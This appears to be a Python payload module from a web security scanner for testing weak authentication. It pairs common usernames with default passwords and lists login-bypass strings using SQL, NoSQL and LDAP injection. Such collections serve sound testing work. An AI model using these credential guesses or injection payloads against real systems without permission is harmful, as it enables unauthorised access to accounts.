"""
Weak Authentication payloads
Contains payloads for testing weak authentication vulnerabilities
"""

class WeakAuthenticationPayloads:
    """Weak Authentication payload collection"""
    
    @staticmethod
    def get_all_payloads():
        """Get all weak authentication payloads"""
        return WeakAuthenticationPayloads.get_weak_credentials() + WeakAuthenticationPayloads.get_auth_bypass_payloads()
    
    @staticmethod
    def get_weak_credentials():
        """Get weak credential combinations"""
        try:
            # Load from wordlists/passwords.txt
            import os
            passwords_file = os.path.join('wordlists', 'passwords.txt')
            if os.path.exists(passwords_file):
                with open(passwords_file, 'r', encoding='utf-8') as f:
                    passwords = [line.strip() for line in f if line.strip()]
                
                usernames = ['admin', 'administrator', 'root', 'user', 'test', 'guest', 'demo', 'manager']
                weak_creds = []
                
                for username in usernames:
                    for password in passwords[:30]:  # Use first 30 passwords
                        weak_creds.append({'username': username, 'password': password})
                
                return weak_creds[:100]  # Limit to 100 combinations
        except:
            pass
        
        # Fallback
        return [
            {'username': 'admin', 'password': 'admin'},
            {'username': 'admin', 'password': 'password'},
            {'username': 'admin', 'password': '123456'},
            {'username': 'root', 'password': 'root'},
            {'username': 'test', 'password': 'test'}
        ]
    
    @staticmethod
    def get_auth_bypass_payloads():
        """Get authentication bypass payloads"""
        return [
            # SQL injection bypasses
            {'username': "admin' or '1'='1' --", 'password': 'anything'},
            {'username': "admin' or 1=1 --", 'password': 'anything'},
            {'username': "admin'/*", 'password': '*/or/**/1=1#'},
            {'username': "' or 'a'='a", 'password': "' or 'a'='a"},
            {'username': "admin' --", 'password': ''},
            {'username': "admin' #", 'password': ''},
            
            # NoSQL injection bypasses
            {'username': '{"$ne": null}', 'password': '{"$ne": null}'},
            {'username': '{"$gt": ""}', 'password': '{"$gt": ""}'},
            
            # LDAP injection bypasses
            {'username': 'admin)(&)', 'password': 'anything'},
            {'username': 'admin)(|(objectClass=*))', 'password': 'anything'}
        ]
